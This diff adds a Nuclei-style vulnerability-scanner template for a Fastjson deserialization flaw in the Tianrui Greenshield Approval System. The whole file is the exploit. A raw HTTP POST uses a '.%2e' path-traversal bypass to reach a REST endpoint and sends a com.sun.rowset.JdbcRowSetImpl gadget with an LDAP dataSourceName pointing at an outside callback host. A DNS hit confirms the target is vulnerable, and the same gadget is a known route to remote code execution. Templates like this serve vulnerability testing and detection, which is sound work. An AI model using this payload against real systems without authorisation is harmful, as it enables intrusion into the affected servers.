@@ -1,0 +1,39 @@
+id: poc-yaml-tipray-gsas-findtrusteesbyuser-fastjson-deserialization
+info:
+  name: Tianrui Greenshield Approval System findTrusteesByUser Fastjson Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: deserialization,dnslog
+  description: |
+    The findTrusteesByUser endpoint in Tianrui Greenshield Approval System is vulnerable to Fastjson deserialization, potentially allowing remote code execution via crafted JSON data.
+
+variables:
+  random: "{{rand_base(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /trwfe/login.jsp/.%2e/rest/ext/findTrusteesByUser HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+            "@type": "com.sun.rowset.JdbcRowSetImpl",
+            "dataSourceName": "ldap://{{interactsh-url}}/{{random}}",
+            "autoCommit": true
+        }
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: body
+        words:
+          - ""
+    extractors:
+      - type: dsl
+        dsl:
+          - "interactsh_request"
